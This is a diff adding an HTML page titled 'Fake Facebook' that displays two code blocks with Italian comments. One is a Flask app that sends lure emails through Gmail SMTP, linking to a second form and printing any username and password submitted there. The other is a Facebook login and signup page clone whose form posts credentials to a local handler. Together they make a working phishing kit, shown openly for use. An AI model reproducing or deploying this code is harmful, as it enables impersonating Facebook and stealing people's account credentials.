@@ -1,0 +1,379 @@
+<head>
+    <h1>Fake Facebook</h1>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pagina HTML con Codice e Commento</title>
+    <style>
+        body {
+            background-color: black;
+            color: white;
+            font-family: Arial, sans-serif;
+        }
+
+        .container {
+            background-color: #333;
+            padding: 20px;
+            margin: 20px;
+            border: 2px solid white;
+        }
+
+        code {
+            display: block;
+            color: #00FF00; /* Colore verde */
+            font-size: 14px;
+            white-space: pre-wrap;
+            overflow-x: auto;
+        }
+
+        .comment {
+            background-color: black;
+            color: #FF00FF; /* Colore magenta */
+            padding: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <code>
+from flask import Flask, render_template, request
+import smtplib
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
+
+app = Flask(__name__)
+
+
+@app.route('/')
+def home():
+    return render_template('form.html')
+
+
+@app.route('/send_email', methods=['POST'])
+def send_email():
+    sender_email = request.form['sender_email']
+    sender_password = request.form['sender_password']
+    recipient_email = request.form['recipient_email']
+    subject = request.form['subject']
+    message = request.form['message']
+
+    # Configura i dettagli del server SMTP di Gmail
+    smtp_server = 'smtp.gmail.com'
+    smtp_port = 587
+
+    # Crea un oggetto SMTP
+    smtp_obj = smtplib.SMTP(smtp_server, smtp_port)
+
+    # Avvia la connessione con il server SMTP
+    smtp_obj.starttls()
+
+    # Effettua il login all'account Gmail
+    smtp_obj.login(sender_email, sender_password)
+
+    # Crea il messaggio email
+    msg = MIMEMultipart()
+    msg['From'] = sender_email
+    msg['To'] = recipient_email
+    msg['Subject'] = subject
+
+    # Aggiungi il corpo del messaggio
+    body = f'{message}\n\nPer accedere al secondo form, visita il seguente link: http://localhost:5000/second_form'
+    msg.attach(MIMEText(body, 'plain'))
+
+    # Invia l'email
+    smtp_obj.send_message(msg)
+
+    # Chiudi la connessione con il server SMTP
+    smtp_obj.quit()
+
+    return 'Email inviata con successo!'
+
+
+@app.route('/second_form', methods=['GET'])
+def second_form():
+    return render_template('fb.html')
+
+
+@app.route('/submit_second_form', methods=['POST'])
+def submit_second_form():
+    username = request.form['username']
+    password = request.form['password']
+
+    print(f'Username: {username}')
+    print(f'Password: {password}')
+
+    return 'Dati del secondo form ricevuti!'
+
+
+if __name__ == '__main__':
+    app.run()
+  
+        </code>
+    </div>
+
+    <div class="comment">
+
+      <p>Serve anche il form</p>    
+    </div>
+</body>
+
+<body>
+    <div class="container">
+        <code>
+          <html>
+    <head>
+
+        <link href="https://fonts.googleapis.com/css?family=Catamaran:700,800&display=swap" rel="stylesheet">
+        <style>
+        body {
+     text-align:center;
+     width:100%;
+     margin:0 auto;
+     padding:0px;
+     font-family:"lucida grande",tahoma,verdana,arial,sans-serif;
+     background: linear-gradient(white, #D3D8E8);
+}
+.main-header {
+     width:100%;
+     min-width:980px;
+     background-color:#4c66a4;
+}
+.header {
+     width:980px;
+     margin:0px auto;
+     padding:0px;
+     height:85px;
+}
+.header li {
+     list-style-type:none;
+     float:left;
+     text-align:left;
+     color:white;
+}
+.header .sitename
+{
+    margin-top: 15px;
+}
+.header .sitename a {
+    color: #fff;
+    text-decoration: none;
+    font-family: 'Catamaran', sans-serif;
+    font-size: 41px;
+    font-weight: 700;
+}
+.header form {
+     margin-top:15px;
+     float:right;
+}
+.header form li {
+     font-size:13px;
+     margin-left:15px;
+}
+.header form li a {
+     color:#A9BCF5;
+     text-decoration:none;
+}
+.header form input[type="text"] {
+     margin-top:3px;
+     margin-bottom:3px;
+     width:150px;
+     border:1px solid #08298A;
+     height:25px;
+     padding-left:3px;
+}
+.header form input[type="password"] {
+     margin-top:3px;
+     margin-bottom:3px;
+     width:150px;
+     border:1px solid #08298A;
+     height:25px;
+     padding-left:3px;
+}
+.header form input[type="submit"] {
+     height:25px;
+     margin-top:20px;
+     background-color:#084B8A;
+     color:white;
+     border:1px solid #08298A;
+}
+.content {
+     margin:0 auto;
+     padding:0px;
+     text-align:center;
+     width:980px;
+}
+.content div {
+    float:left;
+    font-family: helvetica, arial, sans-serif;
+}
+.content .div-1 {
+     margin-top:30px;
+     width:590px;
+     text-align:left;
+}
+.content .div-1 p {
+     font-size:20px;
+     font-family:arial;
+     font-weight:bold;
+     margin:0px;
+     color:#0e385f;
+}
+.content .div-2 {
+     margin-top:10px;
+     width:390px;
+     text-align:left;
+}
+.content .div-2 h1 {
+     margin:0px;
+     font-size:37px;
+     color:#2E2E2E;
+}
+.content .div-2 p {
+     font-size:18px;
+     color:#2E2E2E;
+}
+.content .div-2 li {
+     list-style-type:none;
+     margin-top:10px;
+}
+.content .div-2 li #firstname {
+    width:49%;
+}
+.content .div-2 li #surname {
+    margin-left:2%;
+    width:49%;
+}
+.content .div-2 li input[type="text"] {
+     width:100%;
+     height:40px;
+     border-radius:5px;
+     padding-left:10px;
+     font-size:18px;
+     border:1px solid #BDBDBD;
+}
+.content .div-2 li input[type="password"] {
+    width:100%;
+    height:40px;
+    border-radius:5px;
+    padding-left:10px;
+    font-size:18px;
+    border:1px solid #BDBDBD;
+}
+.content .div-2 li select {
+    padding: 8px;
+    float: left;
+}
+.content .div-2 li a {
+     margin-left:10px;
+     width:150px;
+     color:#045FB4;
+     text-decoration:none;
+     font-size:11px;
+     display: inline-block;
+     vertical-align: middle;
+     line-height:15px;
+}
+.content .div-2 li a:hover {
+    text-decoration:underline;
+}
+.content .div-2 li {
+    color:#2E2E2E;
+    font-size:18px;
+}
+.content .div-2 .terms {
+    color: #424242;
+    font-size: 14px;
+}
+.content .div-2 .terms a {
+    display: inline;
+    margin: 0px;
+    font-size: 14px;
+    line-height: 22px;
+}
+.content .div-2 li input[type="submit"] {
+     width: 205px;
+     height: 45px;
+     text-align: center;
+     font-size: 19px;
+     margin-top: 10px;
+     margin-bottom: 10px;
+     font-weight: bold ;
+     background: linear-gradient(#67ae55, #578843);
+     background-color: #69a74e;
+     box-shadow: inset 0 1px 1px #a4e388;
+     border-color: #3b6e22 #3b6e22 #2c5115;
+     border: 1px solid;
+     border-radius: 5px;
+     color: #fff;
+     cursor: pointer;
+     display: inline-block;
+     position: relative;
+     text-shadow: 0 1px 2px rgba(0,0,0,.5);
+}
+.content .div-2 .create_page {
+     color: #424242;
+     font-size: 14px;
+}
+.content .div-2 .create_page a {
+     display: inline;
+     margin: 0px;
+     font-size: 14px;
+}
+
+.fb-img {
+    width: 536px;
+    height: 194px;
+    margin-top: 20px;
+}
+
+
+
+
+        </style>
+    </head>
+    <body>
+
+        <div class="main-header">
+            <div class="header">
+                <li class="sitename"><a href="https://www.facebook.com/">facebook</a></li>
+                <form action="/pagina_login" method="POST">
+                    <li>Email or Phone<br><input type="text" name="username"></li>
+                    <li>Password<br><input type="password" name="password"><br><a href="#">Forgotten account?</a></li>
+                    <li><input type="submit" name="login" value="Log In"></li>
+                </form>
+            </div>
+        </div>
+
+        <div class="content">
+            <div class="div-1">
+                <p>Facebook helps you connect and share with the<br>people in your life.</p>
+                <img src="static/fb.png" class="fb-img">
+            </div>
+
+            <div class="div-2">
+                <h1>Create an account</h1>
+                <p>It's free and always will be.</p>
+                <li><input type="text" placeholder="First Name" id="firstname"><input type="text" placeholder="Surname" id="surname"></li>
+                <li><input type="text" placeholder="Mobile number or email address"></li>
+                <li><input type="text" placeholder="Re-enter mobile number or email address"></li>
+                <li><input type="password" placeholder="New password"></li>
+                <p>Birthday</p>
+                <li>
+                <select><option>Day</option></select>
+                <select><option>Month</option></select>
+                <select><option>Year</option></select>
+                </li><br><br>
+                <p>Gender</p>
+                <li><input type="radio">Female <input type="radio">Male <input type="radio">Custom</li>
+                <li class="terms">By clicking Sign Up, you agree to our <a href="#">Terms</a>, <a href="#">Data Policy</a> and <br> <a href="#">Cookie Policy</a>. You may receive SMS notifications from us and <br> can opt out at any time.</li>
+                <li><input type="submit" value="Sign Up"></li>
+                <li class="create_page"><a href="#">Create a Page</a> for a celebrity, band or business.</li>
+            </div>
+        </div>
+    </body>
+</html>
+        </code>
+    </div>
+</body>
+
+
+</html>
